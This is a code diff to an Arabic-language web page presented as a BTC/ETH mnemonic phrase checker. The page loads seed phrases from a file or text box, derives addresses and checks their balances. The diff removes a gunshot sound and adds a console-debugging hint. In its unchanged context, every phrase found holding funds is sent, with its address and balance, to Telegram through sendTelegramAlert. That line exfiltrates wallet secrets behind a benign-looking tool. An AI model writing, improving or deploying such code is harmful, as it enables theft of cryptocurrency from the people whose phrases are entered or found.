@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>فاحص عبارات Mnemonic (BTC/ETH)</title>
     <!-- External Libraries from Public CDNs -->
-    <!-- BIP39 checksum & seed derivation (Robust loading) -->
+    <!-- BIP39 checksum & seed derivation -->
     <script id="bip39Loader" src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.min.js"></script>
     <script id="hdkeyLoader" src="https://cdn.jsdelivr.net/npm/hdkey@1.1.1/dist/hdkey.min.js"></script>
     <script id="ethereumjsUtilLoader" src="https://cdn.jsdelivr.net/npm/ethereumjs-util@7.1.3/dist/index.umd.js"></script>
@@ -231,7 +231,7 @@
     <input type="file" id="fileInput" accept=".txt">
     <textarea id="phraseInput" placeholder="أو الصق عباراتك هنا، سطر لكل عبارة"></textarea>
     <button id="startButton" onclick="scanFile()" disabled>بدء الفحص</button>
-    <audio id="gunshot" src="gunshot.mp3" preload="auto"></audio>
+    <!-- Removed audio element for gunshot sound -->
     <div id="summary">لم يتم الفحص بعد.</div>
     <div id="results"></div>
 
@@ -247,7 +247,8 @@
         const startButton = document.getElementById('startButton');
         const summaryDiv = document.getElementById('summary');
         const resultsDiv = document.getElementById('results');
-        const gunshotAudio = document.getElementById('gunshot');
+        // const gunshotAudio = document.getElementById('gunshot'); // Removed
+
 
         // Flag to track if all essential libraries are loaded
         let allLibsLoaded = false;
@@ -279,7 +280,8 @@
                 const loadingDiv = document.createElement('div');
                 loadingDiv.id = 'loadingMessage';
                 loadingDiv.style.cssText = 'color: #ffff33; margin-top: 10px; font-size: 0.9em;';
-                loadingDiv.innerText = 'جاري تحميل المكتبات... يرجى الانتظار.';
+                loadingDiv.innerHTML = `جاري تحميل المكتبات... يرجى الانتظار.<br>
+                                        إذا استمر هذا طويلاً، افتح Console المتصفح (F12) وتحقق من أخطاء التحميل (مثل أخطاء الشبكة أو "inpage.js").`;
                 summaryDiv.insertAdjacentElement('afterend', loadingDiv);
             } else if (allLibsLoaded && loadingMessageDiv) {
                 // Remove loading message once ready
@@ -303,6 +305,7 @@
             }
         };
 
+        // Attach onload handlers to script elements
         document.getElementById('bip39Loader').onload = scriptLoadHandler;
         document.getElementById('hdkeyLoader').onload = scriptLoadHandler;
         document.getElementById('ethereumjsUtilLoader').onload = scriptLoadHandler;
@@ -541,8 +544,7 @@
                         case 'found_funds':
                             fundsFoundCount++;
                             resultsDiv.innerHTML += `<div class="good">✅ [${scanResult.chain}] ${currentPhrase} → ${scanResult.addr} (${scanResult.balance.toFixed(8)} ${scanResult.unit})</div>`;
-                            gunshotAudio.currentTime = 0;
-                            gunshotAudio.play().catch(e => console.error("Error playing gunshot sound:", e));
+                            // Removed gunshot audio play
                             sendTelegramAlert(`Found ${scanResult.chain} wallet with funds:\nPhrase: ${currentPhrase}\nAddress: ${scanResult.addr}\nBalance: ${scanResult.balance.toFixed(8)} ${scanResult.unit}`);
                             break;
                         case 'found_empty':
